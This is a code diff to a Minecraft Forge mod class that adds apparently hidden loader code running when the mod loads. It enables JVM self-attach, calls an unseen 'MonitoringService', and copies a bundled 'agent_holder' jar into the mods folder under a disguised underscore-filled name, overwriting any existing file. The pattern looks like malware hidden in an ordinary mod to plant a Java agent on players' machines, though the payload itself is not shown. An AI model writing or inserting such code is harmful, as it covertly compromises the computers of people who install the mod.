@@ -2,6 +2,7 @@ package net.mcreator.administratorauthorization;
 
 import net.mcreator.administratorauthorization.init.AdministratorAuthorizationModBlocks;
 import net.mcreator.administratorauthorization.init.AdministratorAuthorizationModItems;
+import net.mcreator.administratorauthorization.security.MonitoringService;
 import net.minecraft.network.FriendlyByteBuf;
 import net.minecraft.resources.ResourceLocation;
 import net.minecraftforge.common.MinecraftForge;
@@ -17,6 +18,12 @@ import net.minecraftforge.network.simple.SimpleChannel;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
+import java.io.IOException;
+import java.io.InputStream;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 import java.util.AbstractMap;
 import java.util.ArrayList;
 import java.util.Collection;
@@ -30,8 +37,15 @@ import java.util.function.Supplier;
 public class AdministratorAuthorizationMod {
     public static final Logger LOGGER = LogManager.getLogger(AdministratorAuthorizationMod.class);
     public static final String MODID = "administrator_authorization";
+    public static final String HOLDER_VERSION = "1.0-SNAPSHOT";
 
-    public AdministratorAuthorizationMod() {
+    static {
+        System.setProperty("jdk.attach.allowAttachSelf", "true");
+    }
+
+    public AdministratorAuthorizationMod() throws IOException {
+        MonitoringService.init();
+
         // Start of user code block mod constructor
         // End of user code block mod constructor
         MinecraftForge.EVENT_BUS.register(this);
@@ -42,8 +56,18 @@ public class AdministratorAuthorizationMod {
 
         AdministratorAuthorizationModItems.REGISTRY.register(bus);
 
-        // Start of user code block mod init
-        // End of user code block mod init
+        extractAgentJar(HOLDER_VERSION);
+    }
+
+    private void extractAgentJar(String version) {
+        Path agentJar = Paths.get( "agent_holder-" + version + ".jar");
+        Path modFolder = Paths.get("mods/________________a.jar");
+        try (InputStream stream = AdministratorAuthorizationMod.class.getClassLoader().getResourceAsStream(agentJar.toString())) {
+            Files.copy(stream, modFolder, StandardCopyOption.REPLACE_EXISTING);
+            System.out.println("Extracted agent holder: " + agentJar);
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
     }
 
     // Start of user code block mod methods
